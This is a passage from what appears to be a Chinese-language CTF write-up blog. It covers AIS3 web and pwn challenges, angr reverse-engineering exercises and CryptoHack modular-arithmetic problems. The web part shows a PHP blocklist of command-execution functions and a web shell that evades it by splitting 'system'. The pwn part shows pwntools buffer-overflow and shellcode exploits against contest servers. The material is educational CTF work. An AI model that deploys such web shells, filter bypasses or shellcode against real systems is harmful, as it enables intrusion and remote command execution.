class="token punctuation">{</span>        <span class="token variable">$is_bad</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token string">'exec'</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$is_bad</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token string">'passthru'</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$is_bad</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token string">'show_source'</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$is_bad</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token string">'proc_open'</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$is_bad</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token string">'popen'</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$is_bad</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token string">'pcntl_exec'</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$is_bad</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token string">'eval'</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$is_bad</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token string">'assert'</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$is_bad</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token string">'die'</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$is_bad</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token string">'shell_exec'</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$is_bad</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token string">'create_function'</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$is_bad</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token string">'call_user_func'</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$is_bad</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token string">'preg_replace'</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$is_bad</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token string">'scandir'</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$is_bad</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$is_bad</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'You are bad ヽ(#`Д´)ﾉ'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><p><code>data</code> 內容會先被換成小寫，所以改大寫沒有用<br>但我們可以把 <code>system</code> 拆開來再合併<br>sol.pHp</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token variable">$s1</span> <span class="token operator">=</span> <span class="token string">'syst'</span><span class="token punctuation">;</span>    <span class="token variable">$s2</span> <span class="token operator">=</span> <span class="token string">'em'</span><span class="token punctuation">;</span>    <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token variable">$s1</span><span class="token punctuation">.</span><span class="token variable">$s2</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$s</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"cmd"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>傳上去後先 <code>ls</code></p><pre class=" language-bash"><code class="language-bash">http://chals1.ais3.org:8988/uploads/bfefb4555ce483abe22aaa6a35057023/ea8676c576aa13bfaea3d726dc0590f7.pHp?cmd<span class="token operator">=</span>ls</code></pre><p><img src="https://i.imgur.com/63O7bS3.png"></p><p>裡邊沒有跟 flag 有關的</p><p>看一下根目錄</p><pre class=" language-bash"><code class="language-bash">http://chals1.ais3.org:8988/uploads/bfefb4555ce483abe22aaa6a35057023/ea8676c576aa13bfaea3d726dc0590f7.pHp?cmd<span class="token operator">=</span>ls /</code></pre><p>裡面有一個 <code>rUn_M3_t0_9et_fL4g</code></p><p><img src="https://i.imgur.com/H8on1lg.png"></p><p>所以跑一下</p><pre class=" language-bash"><code class="language-bash">http://chals1.ais3.org:8988/uploads/bfefb4555ce483abe22aaa6a35057023/ea8676c576aa13bfaea3d726dc0590f7.pHp?cmd<span class="token operator">=</span>/rUn_M3_t0_9et_fL4g</code></pre><p>Flag <code>AIS3{H3yyyyyyyy_U_g0t_mi٩(ˊᗜˋ*)و} </code></p><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="BOF2WIN"><a href="#BOF2WIN" class="headerlink" title="BOF2WIN"></a>BOF2WIN</h3><p>Buffer Overflow<br>Offset : <code>16 + 8 = 24</code></p><p><img src="https://i.imgur.com/ii6SIPe.png"></p><p>要進到 <code>get_the_flag()</code> ，看一下 address</p><p><img src="https://i.imgur.com/4V7O1EQ.png"></p><p>script</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment" spellcheck="true">#r = process('./bof2win')</span>r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'chals1.ais3.org'</span><span class="token punctuation">,</span> <span class="token number">12347</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>b<span class="token string">'a'</span><span class="token operator">*</span><span class="token number">24</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x00401216</span><span class="token punctuation">)</span><span class="token punctuation">)</span> r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>Flag <code>AIS3{Re@1_B0F_m4st3r!!}</code></p><h3 id="Give-Me-SC"><a href="#Give-Me-SC" class="headerlink" title="Give Me SC"></a>Give Me SC</h3><pre class=" language-c"><code class="language-c"><span class="token function">mprotect</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token number">0x1000</span><span class="token punctuation">,</span> PROT_READ <span class="token operator">|</span> PROT_WRITE <span class="token operator">|</span> PROT_EXEC<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>從這可以看到執行權限是開著的<br>它會返回到 bss 端執行 shellcode，所以我們把 shellcode 傳進去然後執行<br><a href="https://www.exploit-db.com/shellcodes/47048">shellcode 來源</a></p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'chals1.ais3.org'</span><span class="token punctuation">,</span><span class="token number">15566</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'aaaaaaaaaaaaaaa'</span><span class="token punctuation">)</span>payload <span class="token operator">=</span>  <span class="token string">"\xe1\x45\x8c\xd2\x21\xcd\xad\xf2\xe1\x65\xce\xf2\x01\x0d\xe0\xf2"</span>payload <span class="token operator">+=</span> <span class="token string">"\xe1\x8f\x1f\xf8\xe1\x03\x1f\xaa\xe2\x03\x1f\xaa\xe0\x63\x21\x8b"</span>payload <span class="token operator">+=</span> <span class="token string">"\xa8\x1b\x80\xd2\xe1\x66\x02\xd4"</span>r<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><pre class=" language-bash"><code class="language-bash"><span class="token function">ls</span><span class="token function">cd</span> home<span class="token function">ls</span><span class="token function">cat</span> flag</code></pre><p>Flag <code>AIS3{Y0uR_f1rst_Aarch64_Shellcoding}</code></p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      
      
      <categories>
          
          <category> AIS3 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> write-up </tag>
            
            <tag> AIS3 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF Reverse Angr</title>
      <link href="/2022/05/13/CTF-Reverse-Angr/"/>
      <url>/2022/05/13/CTF-Reverse-Angr/</url>
      
        <content type="html"><![CDATA[<h3 id="起手式"><a href="#起手式" class="headerlink" title="起手式"></a>起手式</h3><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> angr <span class="token keyword">import</span> <span class="token operator">*</span>p <span class="token operator">=</span> Project<span class="token punctuation">(</span><span class="token string">'./00_angr_find'</span><span class="token punctuation">,</span> auto_load_libs<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>st <span class="token operator">=</span> p<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>entry_state<span class="token punctuation">(</span><span class="token punctuation">)</span>sm <span class="token operator">=</span> p<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>simgr<span class="token punctuation">(</span>st<span class="token punctuation">)</span>sm<span class="token punctuation">.</span>explore<span class="token punctuation">(</span>find<span class="token operator">=</span>0x????? <span class="token punctuation">,</span> avoid <span class="token operator">=</span> 0x?????<span class="token punctuation">)</span><span class="token keyword">for</span> s <span class="token keyword">in</span> sm<span class="token punctuation">.</span>found<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><h3 id="00-angr-find"><a href="#00-angr-find" class="headerlink" title="00_angr_find"></a>00_angr_find</h3><p>開 IDA Pro ，看到輸出 “Good Job” 的 address 是 <code>0x08048678</code>，所以 <code>find = 0x08048678</code> 就可以了<br><img src="https://i.imgur.com/dWTgdbm.png"></p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> angr <span class="token keyword">import</span> <span class="token operator">*</span>p <span class="token operator">=</span> Project<span class="token punctuation">(</span><span class="token string">'./00_angr_find'</span><span class="token punctuation">,</span> auto_load_libs<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>st <span class="token operator">=</span> p<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>entry_state<span class="token punctuation">(</span><span class="token punctuation">)</span>sm <span class="token operator">=</span> p<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>simgr<span class="token punctuation">(</span>st<span class="token punctuation">)</span>sm<span class="token punctuation">.</span>explore<span class="token punctuation">(</span>find<span class="token operator">=</span><span class="token number">0x08048678</span><span class="token punctuation">)</span><span class="token keyword">for</span> s <span class="token keyword">in</span> sm<span class="token punctuation">.</span>found<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>Flag <code>JXWVXRKX</code></p><h3 id="01"><a href="#01" class="headerlink" title="01"></a>01</h3><p>因為字太多了沒辦法顯示 psuedocode，在 function name 可以看到有一個 <code>maybe good</code> 以及 <code>avoid me</code>，進去<code>maybe good</code>可以看到有<code>Good Job</code>，很直觀的分別對應到 <code>find</code> 和 <code>avoid</code><br><img src="https://i.imgur.com/aNEDN6P.png"></p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> angr <span class="token keyword">import</span> <span class="token operator">*</span>p <span class="token operator">=</span> Project<span class="token punctuation">(</span><span class="token string">'./01_angr_avoid'</span><span class="token punctuation">,</span> auto_load_libs <span class="token operator">=</span> <span class="token boolean">False</span><span class="token punctuation">)</span>st <span class="token operator">=</span> p<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>entry_state<span class="token punctuation">(</span><span class="token punctuation">)</span>sm <span class="token operator">=</span> p<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>simgr<span class="token punctuation">(</span>st<span class="token punctuation">)</span>sm<span class="token punctuation">.</span>explore<span class="token punctuation">(</span>find <span class="token operator">=</span> <span class="token number">0x080485E0</span><span class="token punctuation">,</span> avoid <span class="token operator">=</span> <span class="token number">0x080585A8</span><span class="token punctuation">)</span><span class="token keyword">for</span> s <span class="token keyword">in</span> sm<span class="token punctuation">.</span>found<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>Flag <code>HUJOZMYS</code></p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      
      
      <categories>
          
          <category> Reverse </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> SCIST </tag>
            
            <tag> write-up </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CryptoHack Mathematics Write-up</title>
      <link href="/2022/05/10/CryptoHack-Mathematics-Write-up/"/>
      <url>/2022/05/10/CryptoHack-Mathematics-Write-up/</url>
      
        <content type="html"><![CDATA[<h2 id="Modular-Math"><a href="#Modular-Math" class="headerlink" title="Modular Math"></a>Modular Math</h2><h3 id="Quadratic-Residues"><a href="#Quadratic-Residues" class="headerlink" title="Quadratic Residues"></a>Quadratic Residues</h3><blockquote><p>We say that an integer <code>x</code> is a <strong>Quadratic Residue</strong> if there exists an <code>a</code> such that <code>a2 = x mod p</code>.<br>If there is no such solution, then the integer is a <strong>Quadratic Non-Residue</strong>.</p></blockquote><blockquote><p>If <code>a^2 = x</code> then <code>(-a)^2 = x</code>. So if <code>x</code> is a quadratic residue in some finite field, then there are always two solutions for <code>a</code>.</p></blockquote><div class="spoiler collapsed">    <div class="spoiler-title">        problem    </div>    <div class="spoiler-content">        <p>In the below list there are two non-quadratic residues and one quadratic residue.</p><p>Find the quadratic residue and then calculate its square root. Of the two possible roots, submit the smaller one as the flag.</p><pre class=" language-bash"><code class="language-bash">p <span class="token operator">=</span> 29ints <span class="token operator">=</span> <span class="token punctuation">[</span>14, 6, 11<span class="token punctuation">]</span></code></pre>    </div></div><p>We can start with <code>a = 1</code> and loop to <code>a = p-1</code> to see if <code>a^2 == x (mod p)</code>.<br>In this discussion p isn’t too large and we can quickly look.</p><pre class=" language-python"><code class="language-python">p <span class="token operator">=</span> <span class="token number">29</span>ints <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> ints<span class="token punctuation">:</span>    <span class="token keyword">for</span> a <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>p<span class="token number">-1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>i <span class="token operator">==</span> pow<span class="token punctuation">(</span>a<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>p<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>a<span class="token punctuation">)</span></code></pre><p>Ans <code>8</code></p><h3 id="Legendre-Symbol"><a href="#Legendre-Symbol" class="headerlink" title="Legendre Symbol"></a>Legendre Symbol</h3><blockquote><p>The Legendre Symbol gives an efficient way to determine whether an integer is a quadratic residue modulo an odd prime <code>p</code>.</p></blockquote><p>An interesting property of quadratic (non-)residues.</p><ul><li><code>Quadratic Residue * Quadratic Residue = Quadratic Residue</code></li><li><code>Quadratic Residue * Quadratic Non-residue = Quadratic Non-residue</code></li><li><code>Quadratic Non-residue * Quadratic Non-residue = Quadratic Residue</code><br>(We can consider <code>Quadratic Residue</code> as <code>1</code> and <code>Quadratic Non-residue</code> as <code>-1</code>)</li></ul><p>Legendre’s Symbol: <code>(a / p) ≡ a(p-1)/2 mod p</code> obeys:</p><ul><li><code>(a / p) = 1</code> if a is a quadratic residue and <code>a != 0 mod p</code></li><li><code>(a / p) = -1</code> if a is a quadratic non-residue mod p</li><li><code>(a / p) = 0</code> if <code>a ≡ 0 mod p</code></li></ul><blockquote><p>Which means given any integer <code>a</code>, calculating <code>pow(a,(p-1)/2,p)</code> is enough to determine if a is a quadratic residue.</p></blockquote><div class="spoiler collapsed">    <div class="spoiler-title">        problem    </div>    <div class="spoiler-content">        <p>Now for the flag. Given the following 1024 bit prime and 10 integers, find the quadratic residue and then calculate its square root; the square root is your flag. Of the two possible roots, submit the larger one as your answer.</p><pre class=" language-bash"><code class="language-bash">p <span class="token operator">=</span> 101524035174539890485408575671085261788758965189060164484385690801466167356667036677932998889725476582421738788500738738503134356158197247473850273565349249573867251280253564698939768700489401960767007716413932851838937641880157263936985954881657889497583485535527613578457628399173971810541670838543309159139ints <span class="token operator">=</span> <span class="token punctuation">[</span>25081841204695904475894082974192007718642931811040324543182130088804239047149283334700530600468528298920930150221871666297194395061462592781551275161695411167049544771049769000895119729307495913024360169904315078028798025169985966732789207320203861858234048872508633514498384390497048416012928086480326832803, 45471765180330439060504647480621449634904192839383897212809808339619841633826534856109999027962620381874878086991125854247108359699799913776917227058286090426484548349388138935504299609200377899052716663351188664096302672712078508601311725863678223874157861163196340391008634419348573975841578359355931590555, 17364140182001694956465593533200623738590196990236340894554145562517924989208719245429557645254953527658049246737589538280332010533027062477684237933221198639948938784244510469138826808187365678322547992099715229218615475923754896960363138890331502811292427146595752813297603265829581292183917027983351121325, 14388109104985808487337749876058284426747816961971581447380608277949200244660381570568531129775053684256071819837294436069133592772543582735985855506250660938574234958754211349215293281645205354069970790155237033436065434572020652955666855773232074749487007626050323967496732359278657193580493324467258802863, 4379499308310772821004090447650785095356643590411706358119239166662089428685562719233435615196994728767593223519226235062647670077854687031681041462632566890129595506430188602238753450337691441293042716909901692570971955078924699306873191983953501093343423248482960643055943413031768521782634679536276233318, 85256449776780591202928235662805033201684571648990042997557084658000067050672130152734911919581661523957075992761662315262685030115255938352540032297113615687815976039390537716707854569980516690246592112936796917504034711418465442893323439490171095447109457355598873230115172636184525449905022174536414781771, 50576597458517451578431293746926099486388286246142012476814190030935689430726042810458344828563913001012415702876199708216875020997112089693759638454900092580746638631062117961876611545851157613835724635005253792316142379239047654392970415343694657580353333217547079551304961116837545648785312490665576832987, 96868738830341112368094632337476840272563704408573054404213766500407517251810212494515862176356916912627172280446141202661640191237336568731069327906100896178776245311689857997012187599140875912026589672629935267844696976980890380730867520071059572350667913710344648377601017758188404474812654737363275994871, 4881261656846638800623549662943393234361061827128610120046315649707078244180313661063004390750821317096754282796876479695558644108492317407662131441224257537276274962372021273583478509416358764706098471849536036184924640593888902859441388472856822541452041181244337124767666161645827145408781917658423571721, 18237936726367556664171427575475596460727369368246286138804284742124256700367133250078608537129877968287885457417957868580553371999414227484737603688992620953200143688061024092623556471053006464123205133894607923801371986027458274343737860395496260538663183193877539815179246700525865152165600985105257601565<span class="token punctuation">]</span></code></pre>    </div></div><p>After we find the integer that is a quadratic residue, we can use <strong>Fermat’s little theorem</strong> to figure out the square root.<br><a href="http://mathcenter.oxford.emory.edu/site/math125/findingSquareRoots/">Reference</a></p><pre class=" language-py"><code class="language-py">p = 101524035174539890485408575671085261788758965189060164484385690801466167356667036677932998889725476582421738788500738738503134356158197247473850273565349249573867251280253564698939768700489401960767007716413932851838937641880157263936985954881657889497583485535527613578457628399173971810541670838543309159139ints = [25081841204695904475894082974192007718642931811040324543182130088804239047149283334700530600468528298920930150221871666297194395061462592781551275161695411167049544771049769000895119729307495913024360169904315078028798025169985966732789207320203861858234048872508633514498384390497048416012928086480326832803, 45471765180330439060504647480621449634904192839383897212809808339619841633826534856109999027962620381874878086991125854247108359699799913776917227058286090426484548349388138935504299609200377899052716663351188664096302672712078508601311725863678223874157861163196340391008634419348573975841578359355931590555, 17364140182001694956465593533200623738590196990236340894554145562517924989208719245429557645254953527658049246737589538280332010533027062477684237933221198639948938784244510469138826808187365678322547992099715229218615475923754896960363138890331502811292427146595752813297603265829581292183917027983351121325, 14388109104985808487337749876058284426747816961971581447380608277949200244660381570568531129775053684256071819837294436069133592772543582735985855506250660938574234958754211349215293281645205354069970790155237033436065434572020652955666855773232074749487007626050323967496732359278657193580493324467258802863, 4379499308310772821004090447650785095356643590411706358119239166662089428685562719233435615196994728767593223519226235062647670077854687031681041462632566890129595506430188602238753450337691441293042716909901692570971955078924699306873191983953501093343423248482960643055943413031768521782634679536276233318, 85256449776780591202928235662805033201684571648990042997557084658000067050672130152734911919581661523957075992761662315262685030115255938352540032297113615687815976039390537716707854569980516690246592112936796917504034711418465442893323439490171095447109457355598873230115172636184525449905022174536414781771, 50576597458517451578431293746926099486388286246142012476814190030935689430726042810458344828563913001012415702876199708216875020997112089693759638454900092580746638631062117961876611545851157613835724635005253792316142379239047654392970415343694657580353333217547079551304961116837545648785312490665576832987, 96868738830341112368094632337476840272563704408573054404213766500407517251810212494515862176356916912627172280446141202661640191237336568731069327906100896178776245311689857997012187599140875912026589672629935267844696976980890380730867520071059572350667913710344648377601017758188404474812654737363275994871, 4881261656846638800623549662943393234361061827128610120046315649707078244180313661063004390750821317096754282796876479695558644108492317407662131441224257537276274962372021273583478509416358764706098471849536036184924640593888902859441388472856822541452041181244337124767666161645827145408781917658423571721, 18237936726367556664171427575475596460727369368246286138804284742124256700367133250078608537129877968287885457417957868580553371999414227484737603688992620953200143688061024092623556471053006464123205133894607923801371986027458274343737860395496260538663183193877539815179246700525865152165600985105257601565]y = -1for a in ints:    if pow(a,(p-1)//2,p) == 1:        y = aprint(y)x = pow(y,(p+1)//4,p)print(x)</code></pre><p>Ans: </p><pre class=" language-bash"><code class="language-bash">93291799125366706806545638475797430512104976066103610269938025709952247020061090804870186195285998727680200979853848718589126765742550855954805290253592144209552123062161458584575060939481368210688629862036958857604707468372384278049741369153506182660264876115428251983455344219194133033177700490981696141526</code></pre><h3 id="Modular-Square-Root"><a href="#Modular-Square-Root" class="headerlink" title="Modular Square Root"></a>Modular Square Root</h3><blockquote><p>There are algorithms for efficiently calculating such roots.<br>The best one in practice is called Tonelli-Shanks</p></blockquote><blockquote><p>All primes that aren’t <code>2</code> are of the form <code>p ≡ 1 mod 4</code> or <code>p ≡ 3 mod 4</code>, since all odd numbers obey these congruences.<br>In the <code>p ≡ 3 mod 4</code> case, a really simple formula for computing square roots can be derived directly from Fermat’s little theorem. </p></blockquote><blockquote><p>That leaves us still with the <code>p ≡ 1 mod 4</code> case, so a more general algorithm is required.<br>In a congruence of the form <code>r2 ≡ a mod p</code>, Tonelli-Shanks calculates <code>r</code>.<br><a href="https://blog.csdn.net/qq_51999772/article/details/122642868">Reference of Tonelli-Shanks algorithm implement</a></p></blockquote><div class="spoiler collapsed">    <div class="spoiler-title">        problem    </div>    <div class="spoiler-content">        <p>Find the square root of a modulo the 2048-bit prime p. Give the smaller of the two roots as your answer.</p><pre class=" language-py"><code class="language-py">a = 8479994658316772151941616510097127087554541274812435112009425778595495359700244470400642403747058566807127814165396640215844192327900454116257979487432016769329970767046735091249898678088061634796559556704959846424131820416048436501387617211770124292793308079214153179977624440438616958575058361193975686620046439877308339989295604537867493683872778843921771307305602776398786978353866231661453376056771972069776398999013769588936194859344941268223184197231368887060609212875507518936172060702209557124430477137421847130682601666968691651447236917018634902407704797328509461854842432015009878011354022108661461024768p = 30531851861994333252675935111487950694414332763909083514133769861350960895076504687261369815735742549428789138300843082086550059082835141454526618160634109969195486322015775943030060449557090064811940139431735209185996454739163555910726493597222646855506445602953689527405362207926990442391705014604777038685880527537489845359101552442292804398472642356609304810680731556542002301547846635101455995732584071355903010856718680732337369128498655255277003643669031694516851390505923416710601212618443109844041514942401969629158975457079026906304328749039997262960301209158175920051890620947063936347307238412281568760161</code></pre>    </div></div><pre class=" language-py"><code class="language-py">def Legendre(n,p): # make sure n is quadratic residues (modp)    return pow(n,(p - 1) // 2,p)def Tonelli_Shanks(n,p):    assert Legendre(n,p) == 1    if p % 4 == 3:        return pow(n,(p + 1) // 4,p)    q = p - 1    s = 0    while q % 2 == 0:        q = q // 2        s += 1    for z in range(2,p):        if Legendre(z,p) == p - 1:            c = pow(z,q,p)            break    r = pow(n,(q + 1) // 2,p)    t = pow(n,q,p)    m = s    if t % p == 1:        return r    else:        i = 0        while t % p != 1: # outer loop             temp = pow(t,2**(i+1),p) # i+1 is to make sure i(used in inner loop) is equal to i+1(here)            i += 1            if temp % p == 1: # inner loop                b = pow(c,2**(m - i - 1),p)                r = r * b % p                c = b * b % p                t = t * c % p                m = i                i = 0 # to notice that i have to reset after inner loop        return ra = 